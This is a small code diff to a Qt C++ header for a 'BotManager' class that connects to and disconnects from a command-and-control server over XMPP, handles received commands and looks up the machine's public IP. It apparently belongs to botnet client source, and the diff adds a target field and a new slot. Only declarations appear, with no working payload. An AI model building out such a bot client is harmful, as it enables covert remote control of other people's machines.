@@ -2,6 +2,7 @@
 #define BOTMANAGER_H
 
 #include <QObject>
+#include <QString>
 
 #define IP_ADDRESS_API "http://api.ipify.org"
 
@@ -22,6 +23,7 @@ public slots:
     void connectToCC();
     void disconnectFromCC();
 private slots:
+    void readyOnXmppClient();
     void commandReceivedOnBot(Message *command);
     void finishedOnNetworkAccessManager(QNetworkReply *reply);
 private:
@@ -34,6 +36,7 @@ private:
 
     XmppClient *_xmppClient;
     Bot *_bot;
+    QString _target;
     QNetworkAccessManager *_networkAccessManager;
 };
 
